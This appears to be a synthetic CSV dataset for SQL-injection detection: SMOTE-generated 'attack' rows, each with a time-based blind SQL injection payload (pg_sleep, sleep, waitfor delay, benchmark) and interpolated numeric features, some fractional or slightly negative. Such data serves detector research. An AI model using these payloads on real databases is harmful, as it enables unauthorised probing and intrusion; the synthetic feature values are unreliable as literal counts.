id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000441,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,3.4719312193149143,85.9305602962938,23.786112059258762,3.262576535122652,19.465280148146903,14.427775881482477,40.251392207405665,11.786112059258762,0.2229037577939355,0.1754168774321679,0.4653525438340135,0.13632682093988305,0.0,1.7861120592587616,1.1069439703706192,0.0,0.0,1.5534719851853096,0.0,6.339584044444071,0.0,0.0,1.0,2.660415955555929,0.0,0.4465280148146905,0.5534719851853096,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5534719851853097,0.0,0.4465280148146904,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000442,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.24847556184035569,66.59959235200145,23.242362477575977,3.5003301907336746,19.533197450667146,10.387779964121563,27.581669946182345,9.09694499103039,0.2929773280385145,0.15529195826497444,0.41453996122414655,0.1371907524723646,0.0,1.0,2.0,0.0,0.0,1.0484724955151954,0.0,4.048472495515195,0.0,1.0,0.0,3.0484724955151954,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.04847249551519517,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0484724955151954
SMOTE_000443,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.3523502218911048,58.87747876460334,21.731232303836116,3.410938271653794,16.16997168613779,10.0,24.415014156931107,8.292492921534446,0.2733556509501459,0.17004989556949532,0.41598433512578675,0.140610118354572,0.43873938230167037,-1.1102230246251565e-16,1.7075070784655528,0.0,0.0,1.0,0.0,3.8537535392327764,0.0,0.0,0.8537535392327765,3.0,0.14624646076722359,0.0,0.8537535392327764,0.14624646076722356,0.0,1.0,1.0,0.0,0.0,0.0,0.1462464607672234,0.14624646076722347,0.0,0.1462464607672235,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.292492921534447
SMOTE_000444,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.4241132632080539,83.71928864448266,25.0,3.2508512655319266,30.71928864448266,1.9280711355517344,39.07192886444827,12.0,0.3663845443914472,0.02313658854279424,0.46701876390910513,0.14346010315665347,0.21578659334479688,0.9280711355517344,0.0,0.0,1.0,0.0,0.0,8.0,0.9280711355517344,0.0,0.0,1.0000000000000002,0.07192886444826557,0.9280711355517344,0.0,0.9280711355517344,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.07192886444826563,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.071928864448266
SMOTE_000445,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,2.169722124544176,85.3576458158674,26.3576458158674,3.7168117785096046,32.43058326346961,10.0,32.2847083682652,10.642354184132598,0.3798238792206603,0.1171578032614673,0.37830340620778624,0.12471491131008611,2.5694167365303935,1.4305832634696065,0.0,0.0,0.0,1.6423541841325984,0.0,4.0,0.0,1.0,0.0,1.6423541841325984,0.6423541841325984,0.3576458158674016,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000446,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.861669565908462,73.53965116570812,21.817876377142532,3.301665416151758,15.0,16.543011017140262,32.36088739428279,9.635752754285065,0.20642750392171477,0.22259250500157945,0.4396417800550154,0.13133821102169027,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.8178763771425328,0.0,4.817876377142532,0.0,0.0,1.0,3.8178763771425324,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8178763771425328,0.0,0.18212362285746725,0.8178763771425327,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.817876377142533
SMOTE_000447,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.8862834907233574,66.33093532528679,25.199280597586036,3.6541770312127038,22.46618706505736,10.0,26.39856119517207,7.4661870650573565,0.3393651179089564,0.15148382381408307,0.39701167608912874,0.11213938218783183,0.2669064674713213,-1.1102230246251565e-16,1.4661870650573574,0.0,0.0,1.0,0.0,3.7330935325286787,0.0,0.7330935325286787,0.0,2.4661870650573574,0.26690646747132135,0.0,0.7330935325286787,0.2669064674713213,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7330935325286787,0.0,0.2669064674713213,0.7330935325286787,0.0,0.7330935325286787,0.0,0.0,0.0,0.0,0.0,0.0,0.2669064674713213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7330935325286787
SMOTE_000448,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,1.1094396184840483,60.99577249885198,22.846479038549848,3.5914034096248018,20.07887423129909,11.228167691601215,23.228167691601215,6.4605628843504554,0.333272682949801,0.18185126384556308,0.37960331893355187,0.10527273427108405,0.8464790385498481,-1.1102230246251565e-16,0.30704192290030385,0.0,0.0,1.1535209614501518,0.0,3.153520961450152,0.0,0.0,0.15352096145015193,1.460562884350456,0.8464790385498481,0.0,0.15352096145015193,0.8464790385498482,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.15352096145015187,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.153520961450152
SMOTE_000449,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,2.6542494796496294,87.56470193907774,20.652100277011105,2.8733049594783577,27.550700092337035,2.0,46.26050138505553,11.753500461685176,0.31858467914575633,0.023178322859718478,0.5255479424280067,0.1326890555665184,0.0,0.5507000923370352,0.0,0.0,1.0,0.0,0.0,9.652100277011105,0.0,0.0,0.0,1.0000000000000002,0.0,0.5507000923370353,0.0,0.5507000923370352,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5507000923370352,0.44929990766296474,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000450,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.8179124187123441,73.66847225702868,26.83423612851434,3.801193918788678,18.336944514057365,21.83423612851434,25.497291614456977,8.0,0.24872990261950073,0.29636394216505824,0.3463002577034721,0.10860589751196895,0.1657638714856594,-1.1102230246251565e-16,1.6684722570286814,0.0,0.0,1.0,0.0,4.165763871485659,0.0,0.0,1.0,2.6684722570286814,0.16576387148565938,0.0,0.8342361285143407,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8342361285143407,0.16576387148565924,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,2.89690584511612,59.18683356211447,17.12526657515421,2.8752252919549304,18.624200274537372,1.0,29.437366712422897,10.12526657515421,0.3131267907908315,0.01692506124444977,0.49788107790231617,0.17206707006240257,1.6878998627313149,1.312100137268685,0.0,0.0,0.0,1.0,0.0,5.0,0.562633287577105,0.562633287577105,0.0,1.0000000000000002,0.5626332875771048,0.43736671242289515,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.43736671242289504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4373667124228953
SMOTE_000452,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,4.585533496242455,61.78979923029998,23.165599560171415,3.6519607867375377,19.331199120342827,11.082799780085708,22.834400439828585,8.541399890042854,0.3101757454974495,0.17901973340635843,0.3725862718176548,0.13821824927853732,1.0827997800857072,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.9172002199142932,0.0,0.0,0.4586001099571465,3.0,0.5413998900428535,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5413998900428535,0.0,0.4586001099571465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4586001099571465,0.0,0.5413998900428535,0.5413998900428535,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5413998900428534
SMOTE_000453,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,0.4171371104812237,82.01934725520928,25.836557875868213,3.2584468516142,19.918278937934105,10.0,40.18278937934107,11.918278937934106,0.24314104984631688,0.12214602536024219,0.4892886952353178,0.14542422955812312,0.9182789379341062,0.08172106206589369,2.0,0.0,0.0,1.0,0.0,6.836557875868213,0.08172106206589369,1.0,0.0,3.0,0.9182789379341062,0.08172106206589386,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9182789379341063,0.08172106206589363,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000454,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,0.8114922537817211,58.9531755147718,17.609364897045637,2.8228219797003575,15.348941495076065,1.1302117009847876,30.953175514771804,11.520846803939147,0.2640445557950748,0.018876435536394023,0.5220976886972736,0.19498131997125767,3.1302117009847867,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.39063510295436,1.1302117009847867,0.8697882990152132,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8697882990152132,0.0,0.0,0.0,1.130211700984787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.13021170098478685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1302117009847867
SMOTE_000455,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.34450563338190837,97.23880675655427,28.0,3.633696751679126,29.524254222846416,18.0,38.80970168913856,10.904850844569284,0.30342547745377785,0.18522692498662396,0.3992105784614471,0.11213701909815112,0.0,0.9048508445692831,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.9048508445692831,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.09514915543071689,0.904850844569283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000456,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.687891410275474,67.64968362192513,25.099789081283422,3.614907595405647,21.199578162566844,10.0,27.54989454064171,8.900210918716578,0.3128739942715929,0.14789265783503486,0.40727966225085077,0.1319536856425215,0.45010545935828916,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.45010545935828916,1.0,0.0,3.0,0.45010545935828905,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000457,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.923536699978236,60.89765063587812,21.206975045419867,3.3484800061023003,15.0,11.655800363358926,26.034875227099327,8.206975045419865,0.24821246179641482,0.1884722017998172,0.4280607033704042,0.1352546330333638,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.2069750454198658,0.0,4.0,0.0,0.0,1.0,3.206975045419866,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2069750454198658,0.0,0.7930249545801342,0.20697504541986578,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.206975045419866
SMOTE_000458,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.8834164672676106,91.57310482884851,27.505623448372962,3.667444722838453,27.033740690237778,18.0,36.03374069023778,10.505623448372964,0.2943713616780128,0.19756111801689397,0.39315192068645977,0.11491559961863346,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.505623448372963,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000459,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.2373629382235454,89.57031485966382,24.02008995990395,3.345632668006707,37.060269879711846,1.2449775100240128,39.755022489975985,11.510044979951974,0.4115683278108955,0.014320483676680179,0.4456791203458846,0.1284320681665398,2.2650674699279616,0.24497751002401275,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.7550224899759872,0.24497751002401286,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000460,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.6923288347887054,85.97708008515414,27.195416017030826,3.682214090666163,24.195416017030826,18.0,33.781664068123305,10.0,0.28145888096783284,0.20946569391728437,0.3927055951608359,0.11636982995404688,0.0,0.8045839829691728,2.0,0.0,0.0,2.0,0.0,4.195416017030827,0.0,1.0,0.0,4.0,0.0,0.8045839829691728,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.19541601703082717,0.8045839829691728,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000461,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,1.9342820895069888,65.79416517508236,25.19854129377059,3.8712207212832954,23.0,11.60291741245882,22.38978905639413,8.801458706229411,0.3497735119226546,0.17673570785035342,0.33950029431190387,0.13399048591508816,1.6029174124588201,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.39708258754118,0.0,0.19854129377058982,0.0,3.0,0.8014587062294102,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.19854129377058982,0.0,0.8014587062294103,0.19854129377058977,0.0,0.19854129377058982,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8014587062294101,0.8014587062294101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000462,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.29842639163299184,65.67928007797065,23.11321334632844,3.4874583087257274,19.0,10.0,27.45285338531376,9.22642669265688,0.28951108960315447,0.1523742576858708,0.4177887124464111,0.1403259402645637,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.11321334632844,0.11321334632843984,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000463,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.15251647176637445,94.59814678482931,27.866048928276438,3.8286694036570617,19.888374106897032,29.732097856552876,34.0,10.977674821379406,0.2101753389553837,0.31395829020200183,0.3597625439939581,0.11610382684865633,0.9776748213794064,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.9776748213794064,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9776748213794064,0.0,0.0,0.0,1.0,0.0,0.9776748213794064,0.022325178620593578,0.0,0.0,0.0,0.0,0.0,0.0,0.022325178620593578,0.9776748213794064,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000464,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,2.212965785589105,89.13337256134174,20.87619608019168,2.8625418344078732,27.625398693397226,2.0,47.38098040095839,12.12699346698613,0.31360950102305507,0.022752747541687005,0.529013341446263,0.13462440998899486,0.0,0.625398693397226,0.0,0.0,1.0,0.0,0.0,9.87619608019168,0.0,0.0,0.0,1.0000000000000002,0.0,0.625398693397226,0.0,0.6253986933972261,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.6253986933972261,0.37460130660277385,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000465,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,3.459673000937399,65.22361065465304,22.521260718872842,3.5211649946245553,18.127564313237055,13.829914249017257,25.829914249017257,7.436217843381472,0.28527082644380236,0.2080340946670169,0.39384310411714957,0.11285197477203121,0.5212607188728429,-1.1102230246251565e-16,0.9574785622543145,0.0,0.0,1.4787392811271571,0.0,3.478739281127157,0.0,0.0,0.4787392811271572,2.436217843381472,0.5212607188728428,0.0,0.47873928112715725,0.5212607188728428,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.47873928112715725,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.478739281127157
SMOTE_000466,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.6493502401614124,76.94729152142648,25.287916649579586,3.3531394830900614,19.643958324789793,10.0,36.01541654705709,11.287916649579586,0.25766752656608677,0.13153104870130253,0.46375330796408426,0.14704811676852644,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.931874974369378,0.35604167521020746,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6439583247897925,0.3560416752102074,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000467,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,2.4085541581594696,78.97456727724781,26.0,3.740223470433314,28.704597057999166,10.0,29.556895586998753,10.713074632249896,0.363176316973391,0.12872322191682387,0.3709881258723743,0.1371123352374109,3.7130746322498958,-1.1102230246251565e-16,0.0,0.0,0.0,1.7130746322498958,0.0,3.7130746322498958,0.0,0.7130746322498959,0.0,2.2869253677501042,1.0,0.0,0.0,0.28692536775010413,0.0,1.0,1.0,0.0,0.0,0.0,0.286925367750104,1.0,0.0,0.28692536775010413,0.7130746322498959,1.7130746322498962,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.28692536775010413,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000468,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.559400413003257,77.24190693784581,23.367453983785865,3.5071060783502856,16.139544986488218,20.73490796757173,30.911635989190575,9.455817994595288,0.2088331337660036,0.26499401298010816,0.4032720150711034,0.12290083818278486,0.2279089972976439,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.227908997297644,0.0,0.0,1.0,4.0,0.22790899729764397,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.22790899729764394,0.0,0.0,0.0,1.0,0.0,0.22790899729764397,0.772091002702356,0.0,0.0,0.0,0.0,0.0,0.0,0.772091002702356,0.22790899729764394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000469,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.12979443162906426,74.58616906476901,27.027912812608047,3.8397878563211565,19.027912812608047,22.22330250086438,25.251215313472432,8.083738437824143,0.25546633512124955,0.2978134659515002,0.33839768230124245,0.10832251662600778,0.02791281260804801,-1.1102230246251565e-16,2.0,0.0,0.0,1.027912812608048,0.0,4.027912812608048,0.0,0.0,1.0,3.027912812608048,0.02791281260804801,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.027912812608047843,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.027912812608048
SMOTE_000470,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.773446616367853,74.90897170655893,26.252954061439908,3.6366814565680583,15.632385153599767,22.13829327647958,28.75886218431972,8.37943109215986,0.20861069524280693,0.29471764767087605,0.3849688405683289,0.11170281651798808,1.0,-1.1102230246251565e-16,0.2529540614399066,0.0,0.0,1.1264770307199532,0.0,5.0,0.0,0.0,1.0,1.3794310921598598,1.0,0.0,0.1264770307199533,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.1264770307199533,0.0,0.1264770307199533,0.8735229692800466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.126477030719953
